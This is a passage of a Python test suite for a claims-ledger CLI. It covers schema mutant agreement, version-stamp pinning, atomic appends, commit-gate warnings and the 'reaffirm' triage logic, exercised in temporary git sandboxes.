def fs2_mutants(record):
    """Yield (name, mutant) pairs enumerating the constraint surface:
    envelope fields, one level of payload, one level of payload dicts."""
    out = []
    for k in list(record):
        m = _clone(record); del m[k]; out.append((f"del {k}", m))
        if isinstance(record[k], str):
            m = _clone(record); m[k] = ""; out.append((f"empty {k}", m))
            m = _clone(record); m[k] = "__XXX__"; out.append((f"junk {k}", m))
    p = record.get("payload")
    if not isinstance(p, dict):
        return out
    for k in list(p):
        m = _clone(record); del m["payload"][k]
        out.append((f"del payload.{k}", m))
        v = p[k]
        if isinstance(v, str):
            for nv, tag in (("", "empty"), ("__XXX__", "junk")):
                m = _clone(record); m["payload"][k] = nv
                out.append((f"{tag} payload.{k}", m))
        elif isinstance(v, bool):
            m = _clone(record); m["payload"][k] = "__XXX__"
            out.append((f"junk payload.{k}", m))
        elif isinstance(v, int):
            m = _clone(record); m["payload"][k] = -1
            out.append((f"neg payload.{k}", m))
        elif isinstance(v, list):
            m = _clone(record); m["payload"][k] = ["__XXX__"]
            out.append((f"junklist payload.{k}", m))
        elif isinstance(v, dict):
            for kk in list(v):
                m = _clone(record); del m["payload"][k][kk]
                out.append((f"del payload.{k}.{kk}", m))
                if isinstance(v[kk], str):
                    m = _clone(record); m["payload"][k][kk] = ""
                    out.append((f"empty payload.{k}.{kk}", m))
    return out

@unittest.skipUnless(JSONSCHEMA, "jsonschema not installed; armed-detector test governs")
class TestGeneratedMutantsAgree(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path, encoding="utf-8") as f:
            cls.validator = JSONSCHEMA.Draft7Validator(json.load(f))

    def test_every_mutant_of_every_valid_seed_agrees(self):
        total = 0
        for seed_name, seed, valid in CORPUS:
            if not valid:
                continue
            for mut_name, mutant in fs2_mutants(seed):
                total += 1
                py_ok = not tm.validate_events([(1, mutant)])
                js_ok = not list(self.validator.iter_errors(mutant))
                self.assertEqual(
                    py_ok, js_ok,
                    f"CONTRACT DRIFT on generated mutant '{seed_name} / "
                    f"{mut_name}': python={py_ok} schema={js_ok}")
        # meta-canary: the generator is detection machinery and must not
        # fail open by generating nothing (the F1 lesson, applied to
        # F1's own fix)
        self.assertGreater(total, 200,
                           f"mutant generator produced only {total} cases")

# ---------------------- cross-surface version consistency (M1)
#
# Four surfaces carry a version stamp -- the CLI (scripts/truth line 2),
# the README title, the schema $id, the paper. M1 found them drifting by
# ~two minor versions because release discipline bumped bodies but not
# stamps, and NOTHING mechanical caught it. These tests make the two
# stamps that are a hard invariant decidable in the battery: the README
# title MUST equal the CLI version (git history shows they moved in
# lockstep every release until the v0.9.x spec-precision batch let the
# README lag), and the schema $id MUST carry the shape fingerprint below
# so a record-shape change (a new `kind`) cannot ship without a conscious
# $id bump (ADR-026). The paper deliberately reference-not-restates its
# version (it points at scripts/truth) and so has no stamp to pin.

_VER_RE = __import__("re").compile(r"v(\d+\.\d+\.\d+)")

def _cli_version():
    with open(os.path.join(HERE, "truth")) as f:
        f.readline()                       # shebang
        m = _VER_RE.search(f.readline())   # `"""truth vX.Y.Z -- ...`
    return m.group(1) if m else None

def _readme_version():
    path = os.path.join(HERE, "..", ".truth", "README.md")
    with open(path) as f:
        m = _VER_RE.search(f.readline())   # `# .truth ... (vX.Y.Z)`
    return m.group(1) if m else None

# R4/v0.9.13 (ADR-026 extension): the satellite docs and the gate script
# carry `current: CLI vX.Y.Z` / `current CLI: vX.Y.Z` stamps. They had
# silently drifted to v0.6.4 / v0.9.0 / v0.4 before these pins existed.
# NOTE the stamps assert only which CLI is CURRENT; each doc's header
# separately states when its CONTENT was last synced (scope note), so a
# pinned header never claims the body describes the current CLI.
_CUR_CLI_RE = __import__("re").compile(r"current:? CLI:? v(\d+\.\d+\.\d+)")

def _satellite_doc_version(name):
    """Version stamp of a meta-repo doc under docs/; None when the doc
    is absent (consumer copies receive template/ only, so these pins
    must skip there, never fail); '' when present but unstamped."""
    path = os.path.join(HERE, "..", "..", "docs", name)
    if not os.path.exists(path):
        return None
    with open(path) as f:
        for line in f:
            m = _CUR_CLI_RE.search(line)
            if m:
                return m.group(1)
    return ""

def _gate_script_version():
    with open(os.path.join(HERE, "check-truth.sh")) as f:
        m = _CUR_CLI_RE.search(f.read())
    return m.group(1) if m else ""

class TestCrossSurfaceVersions(unittest.TestCase):
    """M1: the version stamps that are a hard invariant agree, mechanically."""

    def test_readme_title_equals_cli_version(self):
        cli, readme = _cli_version(), _readme_version()
        self.assertIsNotNone(cli, "could not read CLI version (truth line 2)")
        self.assertIsNotNone(readme, "could not read README title version")
        self.assertEqual(
            readme, cli,
            f"cross-surface drift (M1): README title v{readme} != CLI "
            f"v{cli}. They moved in lockstep every release until v0.9.x; a "
            f"release MUST bump both. Update the README title (ADR-026).")

    # R4/v0.9.13: satellite-doc + gate-script stamps join the lockstep.
    def _assert_doc_pin(self, name, got):
        if got is None:
            self.skipTest(f"docs/{name} absent (consumer copy)")
        self.assertEqual(
            got, _cli_version(),
            f"cross-surface drift (R4): docs/{name} header stamps "
            f"'current: CLI v{got or '<none>'}' but the CLI is "
            f"v{_cli_version()}. A release MUST bump the header stamp "
            "(the content-sync scope note in the same header is separate "
            "and only changes on a real re-sync) (ADR-026).")

    def test_loophole_map_header_pins_cli_version(self):
        self._assert_doc_pin("truth-ledger-loophole-map.md",
                             _satellite_doc_version(
                                 "truth-ledger-loophole-map.md"))

    def test_operations_guide_header_pins_cli_version(self):
        self._assert_doc_pin("truth-ledger-operations-guide.md",
                             _satellite_doc_version(
                                 "truth-ledger-operations-guide.md"))

    def test_check_truth_comment_pins_cli_version(self):
        self.assertEqual(
            _gate_script_version(), _cli_version(),
            "cross-surface drift (R4): check-truth.sh's 'current CLI:' "
            "comment line disagrees with the CLI docstring version. The "
            "gate CONTRACT version in the same header (v0.4) only moves "
            "when the script's semantics change; the 'current CLI:' line "
            "moves every release (ADR-026).")

    # ADR-026: the schema $id is a SCHEMA-CONTRACT version (two-component,
    # independent of the product version), bumped only when the record
    # SHAPE changes. It lapsed three times (v0.8.1 ts pattern, v0.9.0
    # contradicts kind, v0.9.1/2 field additions) because nothing tied the
    # $id to the shape and no test could see it. This pins the shape: any
    # edit to the schema (minus its own $id) breaks the fingerprint, forcing
    # a conscious "is this a shape change? then bump $id" review.
    EXPECTED_SCHEMA_ID = "truth-ledger-record.v0.11"
    PINNED_SHAPE_SHA256 = \
        "edd25306ac120a4f89892e5a51ada7c9650dbe230f58e216814fb44afc51f0dc"

    def _schema(self):
        import json as _json
        path = os.path.join(HERE, "..", ".truth", "schema", "claims.schema.json")
        with open(path) as f:
            return _json.load(f)

    def test_schema_id_is_pinned(self):
        self.assertEqual(
            self._schema().get("$id"), self.EXPECTED_SCHEMA_ID,
            "schema $id changed unexpectedly. The $id is the schema-contract "
            "version (ADR-026): bump it ONLY on a record-shape change, then "
            "update EXPECTED_SCHEMA_ID here.")

    def test_schema_shape_fingerprint(self):
        import json as _json, hashlib, copy
        shape = copy.deepcopy(self._schema())
        shape.pop("$id", None)
        fp = hashlib.sha256(_json.dumps(
            shape, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
        self.assertEqual(
            fp, self.PINNED_SHAPE_SHA256,
            "the record SHAPE changed (schema minus $id). If this is a "
            "contract shape change (new kind / field / constraint), BUMP the "
            "$id to the next minor and EXPECTED_SCHEMA_ID (ADR-026), then "
            "update PINNED_SHAPE_SHA256. If it is a pure comment/description "
            "edit, just update PINNED_SHAPE_SHA256. This test exists because "
            "the $id silently lapsed three times when nobody could see it.")

class TestAppendSingleWrite(unittest.TestCase):
    # The sec-1 concurrent-append safety statement assumes a record line
    # reaches the file in one write(2) call; the buffered text layer broke
    # that for records longer than the stdio buffer (review B-min7).
    def test_append_is_one_write_syscall_even_for_large_records(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, ".truth", "claims.jsonl")
            orig_lp, orig_write = tm.ledger_path, tm.os.write
            calls = []

            def counting_write(fd, data):
                calls.append(len(data))
                return orig_write(fd, data)

            tm.ledger_path = lambda: path
            tm.os.write = counting_write
            try:
                big = claim_p(text="scope " * 4000)  # ~24KB > stdio buffer
                tm.append_record("claim", big)
            finally:
                tm.os.write = orig_write
                tm.ledger_path = orig_lp
            self.assertEqual(len(calls), 1,
                             "append_record must issue exactly one write(2)")
            with open(path, encoding="utf-8") as f:
                lines = f.read().splitlines()
            self.assertEqual(len(lines), 1)
            self.assertEqual(json.loads(lines[0])["kind"], "claim")


# ---------------------- batch-1 hardening (roadmap-v3 R1/R2)
#
# R1 (field-notes-batch-m item 2): a VERIFIED claim whose evidence command
# exits non-zero files normally but warns on stderr -- the double-run
# passes stable *failure*, so a hollow VERIFIED filed silently. R2: write
# verbs print a loud stderr banner when the ADR-025 commit gate is
# unwired; read verbs and `validate --stdin` (inside the gate) exempt.
# The decisions are pure (evidence_exit_warning / commit_gate_banner);
# the printing is a shell seam, so these also run the CLI in throwaway
# git sandboxes (temp dirs only, no network -- TestAppendSingleWrite's
# spirit).

R1_WARN = "truth: warning: evidence command exited"
R2_BANNER = "truth: WARNING -- no commit gate is wired"

def _git(d, *args):
    subprocess.run(["git", "-C", d, *args], check=True, capture_output=True)

def _mk_sandbox(d):
    subprocess.run(["git", "init", "-q", "-b", "main", d], check=True,
                   capture_output=True)
    _git(d, "config", "user.email", "core@test.local")
    _git(d, "config", "user.name", "core-test")
    os.makedirs(os.path.join(d, ".truth"))
    with open(os.path.join(d, "f.txt"), "w") as f:
        f.write("data\n")
    with open(os.path.join(d, ".truth", "evidence-allow"), "w") as f:
        f.write("cat\ngrep\n")
    open(os.path.join(d, ".truth", "claims.jsonl"), "w").close()
    _git(d, "add", "-A")
    _git(d, "commit", "-qm", "init")

def _truth(d, *args, stdin=None, env_extra=None):
    env = dict(os.environ, TRUTH_ACTOR="t", TRUTH_SESSION="s-core-test")
    for k in ("TRUTH_NOW", "TRUTH_HUMAN", "TRUTH_HUMAN_ACK"):
        env.pop(k, None)
    if env_extra:  # R3 tests: per-call session identity / TRUTH_NOW seeding
        env.update(env_extra)
    return subprocess.run([sys.executable, os.path.join(HERE, "truth"),
                           *args], cwd=d, capture_output=True, text=True,
                          env=env, input=stdin)

class TestEvidenceExitWarning(unittest.TestCase):
    """R1: warn (never refuse) when VERIFIED intake's captured evidence
    returncode is non-zero -- a stably-failing probe verifies nothing."""

    def test_warning_fires_only_on_verified_nonzero(self):
        w = tm.evidence_exit_warning("VERIFIED", 2)
        self.assertTrue(w.startswith("truth: warning:"))
        self.assertIn("evidence command exited 2", w)
        self.assertIn("verifies nothing", w)
        self.assertIsNone(tm.evidence_exit_warning("VERIFIED", 0))
        self.assertIsNone(tm.evidence_exit_warning("VERIFIED", None))
        self.assertIsNone(tm.evidence_exit_warning("INFERRED", 2))
        self.assertIsNone(tm.evidence_exit_warning("UNVERIFIED", 2))

    def test_cli_nonzero_exit_warns_but_files_normally(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "f.txt lacks zebra", "--class", "VERIFIED",
                       "--evidence-cmd", "grep zebra f.txt", "--paths", "f.txt")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertRegex(r.stdout.strip().splitlines()[-1],
                             r"^tr-[0-9a-f]{8}$")
            self.assertIn(R1_WARN + " 1", r.stderr)
            with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
                filed = json.loads(f.read().splitlines()[-1])
            # the record is untouched: the captured returncode (first run,
            # never re-run) is in the capsule, the warning is print-only
            self.assertEqual(filed["payload"]["evidence"]["returncode"], 1)
            self.assertEqual(sorted(filed["payload"]),
                             ["anchor_commit", "cost_tier", "evidence",
                              "evidence_class", "evidence_paths", "text",
                              "ttl_days"])

    def test_cli_zero_exit_stays_silent(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "f.txt holds data", "--class", "VERIFIED",
                       "--evidence-cmd", "cat f.txt", "--paths", "f.txt")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertNotIn(R1_WARN, r.stderr)

class TestCommitGateBanner(unittest.TestCase):
    """R2: loud fail-open -- an unwired ADR-025 commit gate is announced
    on every write verb, refused on none."""

    def test_banner_decision_is_pure_and_write_only(self):
        self.assertIsNone(tm.commit_gate_banner("claim", True))
        for verb in sorted(tm.WRITE_VERBS):
            self.assertIn("no commit gate is wired",
                          tm.commit_gate_banner(verb, False))
        for verb in ("list", "queue", "ready", "stats", "impact", "dispatch",
                     "validate", "doctor", "issues", "baseline"):
            self.assertIsNone(tm.commit_gate_banner(verb, False))

    def test_find_gate_hook_matches_doctor_rules(self):
        with tempfile.TemporaryDirectory() as d:
            hooks = os.path.join(d, "hooks")
            os.makedirs(hooks)
            hp = os.path.join(hooks, "pre-commit")
            with open(hp, "w") as f:
                f.write("#!/bin/sh\nexec bash scripts/check-truth.sh\n")
            os.chmod(hp, 0o644)   # git won't run a non-executable hook
            self.assertIsNone(tm.find_gate_hook(hooks, ("pre-commit",),
                                                "check-truth"))
            os.chmod(hp, 0o755)
            self.assertEqual(tm.find_gate_hook(hooks, ("pre-commit",),
                                               "check-truth"), hp)
            # active hook naming the wrong script is not the gate
            self.assertIsNone(tm.find_gate_hook(hooks, ("pre-commit",),
                                                "invalidate-scan"))

    def test_banner_on_write_verb_when_unwired(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "sandbox probe fact", "--tier", "P2")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn(R2_BANNER, r.stderr)
            self.assertIn("This message does not block.", r.stderr)

    def test_banner_never_changes_a_refusals_exit_code(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "verdict", "tr-deadbeef", "agree", "--basis", "b")
            self.assertNotEqual(r.returncode, 0)
            self.assertIn(R2_BANNER, r.stderr)
            self.assertIn("unknown claim", r.stderr)

    def test_banner_absent_with_active_hook(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            hp = os.path.join(d, ".git", "hooks", "pre-commit")
            with open(hp, "w") as f:
                f.write("#!/bin/sh\nexec bash scripts/check-truth.sh\n")
            os.chmod(hp, 0o755)
            r = _truth(d, "claim", "hooked probe fact", "--tier", "P2")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertNotIn(R2_BANNER, r.stderr)

    def test_banner_absent_with_ci_config(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            wf = os.path.join(d, ".github", "workflows")
            os.makedirs(wf)
            with open(os.path.join(wf, "truth.yml"), "w") as f:
                f.write("jobs:\n  gate:\n    steps:\n"
                        "      - run: bash scripts/check-truth.sh\n")
            r = _truth(d, "claim", "ci probe fact", "--tier", "P2")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertNotIn(R2_BANNER, r.stderr)

    def test_read_verbs_and_validate_stdin_exempt(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            for args, stdin in ((("list",), None), (("doctor",), None),
                                (("validate", "--stdin"), "")):
                r = _truth(d, *args, stdin=stdin)
                self.assertNotIn(R2_BANNER, r.stderr,
                                 f"banner leaked on read verb {args}")


# ---------------------- batch-2 churn fix (roadmap-v3 R3, ADR-030)
#
# `truth reaffirm` automates ONLY the mechanical re-confirmation of
# unchanged evidence. The decision is one pure function
# (reaffirm_triage, plus the latest_invalidation_reason /
# previously_agreed fact extractors); the walking/executing/appending is
# a shell seam, so this section holds pure arm tests AND CLI runs in the
# same throwaway git sandboxes the R1/R2 tests use.

def _stale_entry(claim_rec):
    """The fold-entry shape reaffirm_triage receives for a stale claim."""
    return {"claim": claim_rec, "status": "stale",
            "status_ts": claim_rec.get("ts"),
            "anchor": claim_rec["payload"].get("anchor_commit")}

class TestReaffirmTriage(unittest.TestCase):
    """ADR-030: every triage arm, as a pure function of plain data."""

    def triage(self, claim_over=None, reason="evidence paths changed",
               cur="s-other", agreed=True, screen_err=None, recheck=None,
               ttl_staled=None):
        entry = _stale_entry(rec("claim", verified_p(**(claim_over or {}))))
        return tm.reaffirm_triage(entry, reason, cur, agreed,
                                  screen_err=screen_err, recheck=recheck,
                                  ttl_staled=ttl_staled)

    def test_ttl_arm_requires_refile(self):
        d = self.triage(reason="ttl expired (30 days)")
        self.assertEqual(d["arm"], "ttl")
        self.assertIn("re-file required", d["action"])
        self.assertIn("ADR-019", d["action"])

    def test_ttl_outranks_every_other_disability(self):
        # a TTL-staled unscreened same-session claim reports the TTL
        # re-file path -- its more fundamental disability (arm order is
        # the R3 contract)
        d = self.triage(claim_over={"evidence": {"command": "cat f.txt",
                                                 "output_hash": "sha256:" + "0" * 64,
                                                 "returncode": 0,
                                                 "screened": False}},
                        reason="ttl expired (7 days)", cur="s")
        self.assertEqual(d["arm"], "ttl")

    def test_is_ttl_reason_matches_scan_writer(self):
        # the prefix must match what _ttl_expired actually writes
        entry = {"claim": rec("claim", verified_p(ttl_days=3)),
                 "status": "live"}
        written = tm._ttl_expired(entry, {}, NOW)["payload"]["reason"]
        self.assertTrue(tm.is_ttl_reason(written))
        self.assertFalse(tm.is_ttl_reason("evidence paths changed"))
        self.assertFalse(tm.is_ttl_reason(None))

    def test_latest_invalidation_reason_uses_fold_order_not_file_order(self):
        early = rec("invalidation", {"claim": "tr-00000001",
                                     "commit": "abc1234",
                                     "reason": "evidence paths changed"},
                    rid="tr-00000002", ts="2026-07-01T00:00:00.000000+00:00")
        late = rec("invalidation", {"claim": "tr-00000001",
                                    "commit": "abc1234",
                                    "reason": "ttl expired (9 days)"},
                   rid="tr-00000003", ts="2026-07-02T00:00:00.000000+00:00")
        other = rec("invalidation", {"claim": "tr-000000ff",
                                     "commit": "abc1234",
                                     "reason": "anchor unreachable"},
                    rid="tr-00000004", ts="2026-07-03T00:00:00.000000+00:00")
        for order in ((early, late, other), (late, other, early)):
            self.assertEqual(
                tm.latest_invalidation_reason(events(*order), "tr-00000001"),
                "ttl expired (9 days)", "file order leaked into the arm")
        self.assertIsNone(
            tm.latest_invalidation_reason(events(early), "tr-00000099"))

    def test_scan_stamps_reason_code_and_forged_text_cannot_flip_the_arm(self):
        # Red-team F3 hardening. The scan stamps the structured twin...
        entry = {"claim": rec("claim", verified_p(ttl_days=3)),
                 "status": "live"}
        payload = tm._ttl_expired(entry, {}, NOW)["payload"]
        self.assertEqual(payload["reason_code"], "ttl")
        # ...and a LATER raw-appended invalidation with a forged non-TTL
        # free-text reason no longer flips a scan-stamped TTL claim out
        # of the re-file arm into auto-agree: ADR-019 makes TTL expiry
        # monotone, so ANY reason_code=="ttl" record is durable proof.
        scan_ttl = rec("invalidation", {"claim": "tr-00000001",
                                        "commit": "abc1234",
                                        "reason": "ttl expired (3 days)",
                                        "reason_code": "ttl"},
                       rid="tr-00000002",
                       ts="2026-07-01T00:00:00.000000+00:00")
        forged = rec("invalidation", {"claim": "tr-00000001",
                                      "commit": "abc1234",
                                      "reason": "evidence paths changed"},
                     rid="tr-00000003",
                     ts="2026-07-02T00:00:00.000000+00:00")
        evs = events(scan_ttl, forged)
        # the latest free-text reason IS the forged non-TTL one --
        # exactly the text the prefix-only scheme keyed off...
        self.assertEqual(tm.latest_invalidation_reason(evs, "tr-00000001"),
                         "evidence paths changed")
        # ...but the structured fact wins, and the triage arm stays ttl
        self.assertTrue(tm.ttl_staleness(evs, "tr-00000001"))
        d = self.triage(reason="evidence paths changed", ttl_staled=True)
        self.assertEqual(d["arm"], "ttl")
        self.assertIn("re-file required", d["action"])

    def test_ttl_staleness_falls_back_to_prefix_for_prestamp_records(self):
        # records that predate the stamp carry no reason_code: the
        # latest-reason prefix match remains their (forgeable -- the
        # accepted sec-8-item-6 residual, ADR-030) fallback
        legacy = rec("invalidation", {"claim": "tr-00000001",
                                      "commit": "abc1234",
                                      "reason": "ttl expired (9 days)"},
                     rid="tr-00000002")
        self.assertTrue(tm.ttl_staleness(events(legacy), "tr-00000001"))
        other = rec("invalidation", {"claim": "tr-00000001",
                                     "commit": "abc1234",
                                     "reason": "evidence paths changed"},
                    rid="tr-00000002")
        self.assertFalse(tm.ttl_staleness(events(other), "tr-00000001"))
        self.assertFalse(tm.ttl_staleness([], "tr-00000001"))

    def test_previously_agreed(self):
        agree = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "b"}, rid="tr-00000002")
        diverge = rec("verdict", {"claim": "tr-00000001",
                                  "verdict": "diverge", "basis": "b"},
                      rid="tr-00000003")
        self.assertTrue(tm.previously_agreed(events(agree), "tr-00000001"))
        self.assertFalse(tm.previously_agreed(events(diverge), "tr-00000001"))
        self.assertFalse(tm.previously_agreed(events(agree), "tr-00000099"))

    def test_unscreened_arm_never_reaches_execution(self):
        d = self.triage(claim_over={"evidence": {"command": "wc -l f.txt",
                                                 "output_hash": "sha256:" + "0" * 64,
                                                 "returncode": 0,
                                                 "screened": False}})
        self.assertEqual(d["arm"], "manual")
        self.assertIn("manual verification only", d["action"])
        self.assertIn("evidence.screened=false", d["action"])

    def test_same_session_arm_is_adr010(self):
        d = self.triage(cur="s")  # rec()'s session is "s"
        self.assertEqual(d["arm"], "same_session")
        self.assertIn("ADR-010", d["action"])
        # TRUTH_SELF_VERDICT: the shell passes an unmatchable session
        d = self.triage(cur=None)
        self.assertEqual(d["arm"], "execute")

    def test_no_evidence_command_is_manual(self):
        entry = _stale_entry(rec("claim", claim_p()))  # UNVERIFIED, no capsule
        d = tm.reaffirm_triage(entry, "evidence paths changed", "s-other",
                               True)
        self.assertEqual(d["arm"], "manual")
        self.assertIn("no evidence command", d["action"])

    def test_never_agreed_is_first_verification_not_reconfirmation(self):
        d = self.triage(agreed=False)
        self.assertEqual(d["arm"], "manual")
        self.assertIn("first verification is a judgment", d["action"])
        self.assertIn("ADR-030", d["action"])

    def test_current_screen_refusal_is_manual(self):
        d = self.triage(screen_err="'wc' is not in .truth/evidence-allow")
        self.assertEqual(d["arm"], "manual")
        self.assertIn("manual verification only", d["action"])
        self.assertIn("'wc' is not in", d["action"])

    def test_execute_sentinel_then_match(self):
        self.assertEqual(self.triage()["arm"], "execute")
        d = self.triage(recheck=("agree", "recheck: output hash matches"))
        self.assertEqual(d["arm"], "match")
        self.assertIn(tm.REAFFIRM_BASIS, d["action"])

    def test_mismatch_files_nothing_not_even_diverge(self):
        d = self.triage(recheck=("diverge", "recheck: MISMATCH"))
        self.assertEqual(d["arm"], "mismatch")
        self.assertIn("dispatch for judgment", d["action"])
        self.assertIn("nothing filed", d["action"])
        self.assertIn("ADR-012", d["action"])

    def test_exit_127_is_environment_not_divergence(self):
        d = self.triage(recheck=("cannot_verify",
                                 "recheck: evidence command not found "
                                 "(exit 127)"))
        self.assertEqual(d["arm"], "manual")
        self.assertIn("exit 127", d["action"])

class TestReaffirmCLI(unittest.TestCase):
    """R3 end-to-end in throwaway sandboxes: file -> verify -> stale ->
    reaffirm, one test per arm plus dry-run and --json."""

    def _ledger_lines(self, d):
        with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
            return f.read().splitlines()

    def _stale_verified_claim(self, d):
        """claim watching f.txt AND g.txt (evidence reads only f.txt) ->
        verifier agree -> commit touching g.txt -> scan => stale with
        UNCHANGED evidence output. Returns the claim id."""
        with open(os.path.join(d, "g.txt"), "w") as f:
            f.write("peer\n")
        _git(d, "add", "g.txt")
        _git(d, "commit", "-qm", "add g")
        r = _truth(d, "claim", "f.txt holds data", "--class", "VERIFIED",
                   "--evidence-cmd", "cat f.txt", "--paths", "f.txt,g.txt")
        self.assertEqual(r.returncode, 0, r.stderr)
        cid = r.stdout.strip().splitlines()[-1]
        r = _truth(d, "verdict", cid, "agree", "--basis", "checked",
                   env_extra={"TRUTH_SESSION": "s-verifier"})
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(os.path.join(d, "g.txt"), "a") as f:
            f.write("more\n")
        _git(d, "add", "g.txt")
        _git(d, "commit", "-qm", "touch watched peer path")
        r = _truth(d, "invalidate-scan")
        self.assertIn(cid, r.stdout)
        return cid

    def test_reaffirm_cycle_stale_to_live_and_anchor_advances(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            cid = self._stale_verified_claim(d)
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("filed agree", r.stdout)
            self.assertIn("1 reaffirmed", r.stdout)
            filed = json.loads(self._ledger_lines(d)[-1])
            self.assertEqual(filed["kind"], "verdict")
            self.assertEqual(filed["payload"]["verdict"], "agree")
            self.assertEqual(filed["payload"]["basis"], tm.REAFFIRM_BASIS)
            head = subprocess.run(["git", "-C", d, "rev-parse", "HEAD"],
                                  capture_output=True,
                                  text=True).stdout.strip()
            # F2: the agree carries the CURRENT head as anchor_commit ...
            self.assertEqual(filed["payload"]["anchor_commit"], head)
            r = _truth(d, "list", "--live")
            self.assertIn(cid, r.stdout)
            # ... and the fold picks it up: the next scan diffs from the
            # new anchor and the claim STAYS live (no re-stale loop)
            r = _truth(d, "invalidate-scan")
            self.assertIn("0 claim(s) marked stale", r.stdout)
            r = _truth(d, "list", "--live")
            self.assertIn(cid, r.stdout)

    def test_ttl_staled_claim_skips_and_files_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            past = {"TRUTH_NOW": "2026-01-01T00:00:00+00:00"}
            r = _truth(d, "claim", "external fact with a shelf life",
                       "--class", "VERIFIED", "--evidence-cmd", "cat f.txt",
                       "--ttl-days", "1", env_extra=past)
            cid = r.stdout.strip().splitlines()[-1]
            _truth(d, "verdict", cid, "agree", "--basis", "checked",
                   env_extra={"TRUTH_SESSION": "s-verifier",
                              "TRUTH_NOW": "2026-01-01T00:01:00+00:00"})
            r = _truth(d, "invalidate-scan")  # real now: long past the TTL
            self.assertIn(cid, r.stdout)
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertIn("re-file required", r.stdout)
            self.assertIn("ADR-019", r.stdout)
            self.assertIn("1 ttl (re-file)", r.stdout)
            self.assertEqual(len(self._ledger_lines(d)), n,
                             "TTL arm must file nothing")
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout)

    def test_same_session_skips_with_adr010(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            self._stale_verified_claim(d)  # authored by s-core-test
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm")  # runs AS s-core-test: the author
            self.assertIn("must not self-agree", r.stdout)
            self.assertIn("ADR-010", r.stdout)
            self.assertIn("1 same-session", r.stdout)
            self.assertEqual(len(self._ledger_lines(d)), n,
                             "same-session arm must file nothing")

    def test_mismatch_is_never_auto_agreed_or_auto_diverged(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            cid = self._stale_verified_claim(d)
            # now the evidence OUTPUT changes too -- reality moved
            with open(os.path.join(d, "f.txt"), "w") as f:
                f.write("mutated\n")
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("diverged evidence -- dispatch for judgment",
                          r.stdout)
            self.assertIn("1 diverged (dispatch)", r.stdout)
            self.assertEqual(len(self._ledger_lines(d)), n,
                             "a mismatch must file NOTHING (ADR-030)")
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout, "status must stay stale")

    def test_unscreened_evidence_is_never_executed(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            marker = os.path.join(d, "PWNED")
            # touch is NOT allowlisted; --evidence-unsafe-ok files it with
            # screened=false (it runs at intake, in the author's own
            # session -- ADR-029; that is the marker's origin)
            r = _truth(d, "claim", "unsafe probe of f.txt", "--class",
                       "VERIFIED", "--evidence-cmd", "touch PWNED",
                       "--paths", "f.txt", "--evidence-unsafe-ok")
            self.assertEqual(r.returncode, 0, r.stderr)
            cid = r.stdout.strip().splitlines()[-1]
            self.assertTrue(os.path.exists(marker))
            os.unlink(marker)
            _truth(d, "verdict", cid, "agree", "--basis", "ran it myself",
                   env_extra={"TRUTH_SESSION": "s-verifier"})
            with open(os.path.join(d, "f.txt"), "a") as f:
                f.write("more\n")
            _git(d, "add", "f.txt")
            _git(d, "commit", "-qm", "touch watched path")
            _truth(d, "invalidate-scan")
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertIn("manual verification only", r.stdout)
            self.assertIn("1 manual", r.stdout)
            self.assertFalse(os.path.exists(marker),
                             "reaffirm EXECUTED a screened=false command")
            self.assertEqual(len(self._ledger_lines(d)), n)

    def test_dry_run_reports_match_but_files_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            cid = self._stale_verified_claim(d)
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm", "--dry-run",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertIn("would file agree", r.stdout)
            self.assertIn("[dry-run: nothing filed]", r.stdout)
            self.assertEqual(len(self._ledger_lines(d)), n,
                             "--dry-run must file nothing")
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout)

    def test_delisted_command_is_rescreened_and_never_executed(self):
        """Red-team F3: rescreen against CURRENT policy, end-to-end. A
        command that was allowlisted at filing but has since been REMOVED
        from .truth/evidence-allow must land in the manual arm with
        nothing filed and the command never executed (marker-file
        proof), even though the capsule says screened=true."""
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
